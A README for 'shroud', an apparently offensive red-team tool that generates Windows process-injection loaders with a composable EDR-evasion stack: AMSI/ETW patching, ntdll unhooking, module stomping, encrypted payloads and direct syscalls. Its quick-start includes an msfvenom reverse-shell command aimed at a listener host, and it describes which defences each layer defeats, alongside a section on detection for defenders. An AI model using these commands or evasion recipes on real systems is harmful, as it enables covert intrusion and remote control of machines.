<div align="center">

# shroud

**A process-injection payload generator for authorized red-team work.**

Wraps the 25 techniques of the Offensive-Panda
[Process Injection Series](https://offensive-panda.github.io/ProcessInjectionTechniques/)
in a composable, modern **EDR-evasion stack**, emits buildable C, and
cross-compiles a real Windows PE with `mingw-w64`.

[![license](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![python](https://img.shields.io/badge/python-3.9%2B-yellow.svg)](https://www.python.org/)
[![platform](https://img.shields.io/badge/platform-Linux%20%2F%20WSL%20%2F%20macOS-green.svg)](#installation)
[![ATT&CK](https://img.shields.io/badge/ATT%26CK-T1055-red.svg)](https://attack.mitre.org/techniques/T1055/)
[![scope](https://img.shields.io/badge/use-authorized%20pentest%20only-critical.svg)](#authorized-use--disclaimer)

</div>

---

> ## ⚠️ Authorized use only
> `shroud` generates offensive code. Use it **only** against systems you own or
> are explicitly authorized to test. Unauthorized use is illegal. You are solely
> responsible for engagement scope, consent, and compliance with all applicable
> law. See [LICENSE](LICENSE) and [SECURITY.md](SECURITY.md).
>
> `generate` and `build` are gated behind a one-time `./shroud authorize`.

---

## Why

Most "injection" learning material stops at *the technique* — how to call
`CreateRemoteThread`. Real EDRs don't care about the technique in isolation;
they care about the **indicators** that surround it (the import table, the
on-disk bytes, AMSI/ETW telemetry, hooked stubs, thread-creation events,
unbacked executable memory). `shroud` separates the two:

- a **technique** (`pe01`..`pe25`) — *what* to inject / how to execute, and
- an **evasion stack** (`-e ...`) — *how* to do it without the usual tells.

A purpose-built **modern implant** (`pe26`) composes the full stack into one
loader you can throw at a modern EDR.

## Highlights

- **26 techniques catalogued** (Offensive-Panda series) — 9 fully code-generated,
  the rest emit documented, compiling scaffolds.
- **Composable evasion layers**: AES-256-CBC at rest, module stomping, callback
  execution, dynamic-API resolution (PEB walk + FNV/ROR13), AMSI/ETW runtime
  patching, ntdll unhooking (disk *or* KnownDlls), encrypting sleep, and
  direct/indirect syscalls (Hell's Gate SSN resolution).
- **Real output**: cross-compiles a Windows **EXE** or **DLL** (or emits
  source-only `C` for review).
- **Verified hygiene**: a full-stack `pe26` build has the injection-indicator
  triad **absent from the IAT**, no plaintext AMSI/ETW strings, and an
  AES-encrypted payload.
- **Bring your own shellcode** (`msfvenom`, `donut`, `sliver`/`havoc`, custom) —
  shroud ships no operational payload (a benign demo stub lets you smoke-test).

## Table of contents

- [Install](#install)
- [Quick start](#quick-start)
- [The modern implant (`pe26`)](#the-modern-implant-pe26)
- [Techniques](#techniques)
- [Evasion layers](#evasion-layers--e)
- [Verified build hygiene](#verified-build-hygiene)
- [How it works](#how-it-works)
- [Extending](#extending)
- [Limitations — what it is NOT](#limitations--what-it-is-not)
- [For defenders](#for-defenders)
- [Authorized use & disclaimer](#authorized-use--disclaimer)
- [Contributing](#contributing)
- [Credits & references](#credits--references)
- [License](#license)

---

## Install

Requirements: **Python 3.9+** and the **mingw-w64** cross-compiler. No Python
dependencies are required unless you use `-e aes`.

```bash
# Kali / Debian / Ubuntu
sudo apt install mingw-w64

# macOS (Homebrew)
brew install mingw-w64

# optional: only for the AES layer (-e aes)
pip install pycryptodome
```

Clone and go:

```bash
git clone https://github.com/<you>/shroud.git
cd shroud
./shroud authorize          # one-time authorized-use acknowledgment
./shroud list
```

## Quick start

```bash
# browse the catalog
./shroud list
./shroud show 8                 # process hollowing detail

# non-destructive smoke test (benign demo stub, no shellcode)
./shroud generate pe26 -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd

# stage your own shellcode and build the modern implant
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o sc.bin EXITFUNC=thread
./shroud generate pe26 -s sc.bin \
    -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd
```

Each `generate` writes a self-contained project to `./out/<id>/`:
`main.c`, `syscalls.S` (syscall techniques), `Makefile`, `build.sh`, `README.md`.

See [`examples/`](examples/) for a quickstart script and a recipes doc.

## The modern implant (`pe26`)

`pe26` is not a single injection trick — it is a composed loader built to test a
modern EDR. It is the recommended starting point.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
    -f raw -o sc.bin EXITFUNC=thread
./shroud generate pe26 -s sc.bin \
    -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd
```

The full stack, in execution order:

1. **dynamic-api** (+ FNV hash) resolves every Win32 API at runtime via a PEB
   walk — the binary imports nothing suspicious.
2. **amsi** / **etw** are runtime-patched (hash-resolved — no plaintext names).
3. **unhook-kd** restores ntdll's `.text` from `\KnownDlls\ntdll.dll` (no disk read).
4. **aes** decrypts the payload in place (AES-256-CBC).
5. **stomp** copies it into a legitimate module's `.text` → file-backed RX memory.
6. **callbacks** runs it via `CreateTimerQueueTimer` → no `CreateThread` event.

Drop layers one at a time to isolate exactly what a sensor catches.

## Techniques

All 25 Offensive-Panda labs are catalogued. `*` = fully code-generated; `.` =
emits a documented scaffold (compiles; flow + references + a starter `main.c`).

| id | technique | gen |
|----|-----------|:--:|
| pe01 | Local classic shellcode | ✅ |
| pe02 | Remote `CreateRemoteThread` | ✅ |
| pe03 | Classic + API obfuscation (= pe02 + dynamic-api) | ✅ |
| pe04 | VirtualProtect RW→RX bypass | ✅ |
| pe05 | Classic DLL (LoadLibrary) | ✅ |
| pe06 | Reflective DLL | ⬜ |
| pe07 | Lagos Island (manual ntdll) | ⬜ |
| pe08 | Process hollowing | ✅ |
| pe09 | PE injection (whole image) | ⬜ |
| pe10 | AddressOfEntryPoint / WPM magic | ⬜ |
| pe11 | APC injection | ⬜ |
| pe12 | Early Bird APC | ⬜ |
| pe13 | RWX hunting | ⬜ |
| pe14 | Process ghosting | ⬜ |
| pe15 | Remote thread hijacking | ⬜ |
| pe16 | Module stomping (standalone) | ⬜ |
| pe17 | PEB walk (= pe02 + dynamic-api) | ✅ |
| pe18 | PEB walk + obfuscation | ⬜ |
| pe19 | `NtCreateSection` / `NtMapViewOfSection` | ⬜ |
| pe20 | Mokingjay | ⬜ |
| pe21 | Fork API (Dirty Vanity) | ⬜ |
| pe22 | Fibers | ⬜ |
| pe23 | NT (undocumented) API injection | ✅ |
| pe24 | Direct syscalls | ✅ |
| pe25 | Indirect syscalls | ✅ |
| **pe26** | **Modern implant loader (full stack)** | ✅ |

(`pe16` standalone is a scaffold; the `stomp` *evasion layer* is fully
implemented and used by `pe26`.)

## Evasion layers (`-e`)

Composable; combine freely. Run `./shroud generate <id> -e <csv>`.

| layer | defeats |
|-------|---------|
| `dynamic-api` | static IAT analysis — all Win32 APIs resolved via PEB walk + hash (`--hash fnv` default / `ror13`) |
| `aes` | on-disk & static signatures — **AES-256-CBC** (verified vs pycryptodome) |
| `rc4` / `xor` | lighter encrypt-at-rest alternatives |
| `amsi` | content scanning — patches `AmsiScanBuffer` (hash-resolved when dynamic-api on) |
| `etw` | userland telemetry — patches `ntdll!EtwEventWrite` (hash-resolved) |
| `unhook` | userland hooks — restores ntdll `.text` from a fresh disk copy |
| `unhook-kd` | same via `\KnownDlls\ntdll.dll` — **no disk read**, stealthier |
| `stomp` | unbacked-memory checks — backs payload with a legit module's `.text` (`--stomp-dll`) |
| `callbacks` | thread telemetry — `CreateTimerQueueTimer` instead of `CreateThread` |
| `sleep` | memory scanners — RW + XOR-scramble the region while idle |

`pe24` / `pe25` additionally bypass **all** userland hooks via direct/indirect
syscalls (Hell's Gate / Halo's Gate SSN resolution, runtime, version-independent).

## Verified build hygiene

A `pe26 -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd` build, checked
with `objdump` / `strings`:

| check | result |
|-------|--------|
| `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` in IAT | **absent** |
| `CreateThread`, `LoadLibraryA`, `GetProcAddress`, `CreateTimerQueueTimer` in IAT | **absent** |
| plaintext `amsi.dll` / `AmsiScanBuffer` / `EtwEventWrite` / API-name strings | **absent** |
| msfvenom shellcode prologue (`fc 48 83 e4 f0 e8 …`) in the binary | **0 hits** (AES-encrypted) |

The single residual import, `VirtualProtect`, is baseline **mingw-CRT** noise —
present even in an empty `int main(){}` — and is not an injection indicator.

Reproduce:

```bash
EXE=out/<id>/*.exe
x86_64-w64-mingw32-objdump -p "$EXE" | grep -Ei 'CreateRemoteThread|WriteProcessMemory|OpenProcess|VirtualAllocEx'
strings -n 6 "$EXE" | grep -Ei 'AmsiScan|EtwEventWrite|LoadLibraryA'
xxd "$EXE" | grep -c 'fc48 83e4 f0e8'
```

## How it works

```
            ┌──────────────┐
  shellcode │ shellcode.py │  ingest + AES/RC4/XOR → C array
──────────► │              │
            └──────┬───────┘
                   │
            ┌──────▼───────┐    technique (pe01..pe25): the injection/execution body
            │ techniques.py│◄──────────────────────────────────────────
            └──────┬───────┘
                   │   evasion.assemble(): compose layers
            ┌──────▼───────┐    cstubs.py: PEB/hash resolver, syscalls, AMSI/ETW,
            │  payload.py  │    unhook, AES/RC4/XOR, module stomping, callbacks
            └──────┬───────┘
                   │   writes project (main.c, syscalls.S, Makefile, README.md)
            ┌──────▼───────┐
            │  builder.py  │   x86_64-w64-mingw32-gcc  →  EXE / DLL
            └──────────────┘
```

Generated C ordering matters for hygiene: the dynamic-API `#define`s sit
**between** the resolver/typedefs and the helper functions that use the names,
so every call resolves through a runtime pointer rather than a real import.

## Extending

Adding a technique is a few lines — see [`CONTRIBUTING.md`](CONTRIBUTING.md).
Sketch:

1. Add metadata to `lib/registry.py` (`implemented=True`).
2. Add a generator in `lib/techniques.py` returning `{api_names, needs_*, main, note}`; register it in `IMPLEMENTED`.
3. List any new Win32 API in `evasion.SIGNATURES` so `-e dynamic-api` remaps it.

Adding an evasion layer: add the C to `lib/cstubs.py`, wire it in
`evasion.assemble()`, and list it in `evasion.OPTIONS`.

## Limitations — what it is NOT

- **Userland only.** Kernel callbacks (ETW Threat-Intelligence, minifilters,
  `PsSetCreateProcessNotifyRoutine`, object notifications) still observe
  execution and module loads. No pure-userland loader escapes a top-tier EDR's
  kernel sensor — `shroud` will clear static / IAT / AMSI / ETW-userland /
  unhook checks, not kernel telemetry.
- `sleep` is a simple RW + XOR scramble, **not** a full Ekko/Foliage
  timer/APC scheme.
- Syscall SSNs are resolved at runtime (version-independent), but assume a
  standard ntdll layout.
- Output is **not packed** — wrap with your own loader/packer for static-AV
  avoidance.
- The lone `VirtualProtect` import is mingw-CRT noise, not removable without a
  custom entry point (not worth the fragility).

## For defenders

`shroud` is published openly so detection engineering is not asymmetric. Useful
detection surfaces for the techniques and layers here:

- **Kernel** (high-signal, hard to evade): image-load, thread-create, map-view,
  write-VM, protect-VM callbacks; ETW-TI.
- **Memory**: private, non-image-backed RX/RWX regions; stomped modules
  (on-disk `.text` ≠ in-memory `.text`); ntdll `.text` integrity (detect
  KnownDlls re-mapping); AMSI/ETW patching (code-integrity on those prologues).
- **Call stack / return address**: syscalls originating outside ntdll's address
  range (direct syscalls).
- **Behavior**: `CreateTimerQueueTimer` / fibers as shellcode entry points.

Blue-team readers: the evasion layers each map to a detectable indicator above —
that mapping is the point of the tool.

## Authorized use & disclaimer

`shroud` is provided for **security research and authorized penetration testing
only**. The authors and contributors:

- grant you the software under the [MIT license](LICENSE), but
- grant you **no authorization** to attack any system, and
- accept **no liability** for misuse.

You must ensure you have explicit written authorization before testing any
target, and you must comply with all applicable laws. If in doubt, don't.

## Contributing

PRs that add techniques, evasion layers, or improve the generated C are welcome.
Read [`CONTRIBUTING.md`](CONTRIBUTING.md) first. By contributing you agree your
contributions are licensed under the MIT license.

## Credits & references

- **Offensive-Panda** — the [Process Injection Series](https://offensive-panda.github.io/ProcessInjectionTechniques/)
  that this tool catalogues.
- **MITRE ATT&CK** — [T1055 Process Injection](https://attack.mitre.org/techniques/T1055/) and sub-techniques.
- **Hell's Gate / Halo's Gate** — runtime syscall-number resolution.
- **tiny-AES-c** (kokke, public domain) — basis of the embedded AES-256.
- **Maldev Academy**, the **SysWhispers** family, and the broader public
  malware-development / detection-engineering community.

Technique inspiration and naming follow the Offensive-Panda lab series; `pe26`
is shroud's own composition.

## License

[MIT](LICENSE) © shroud contributors.
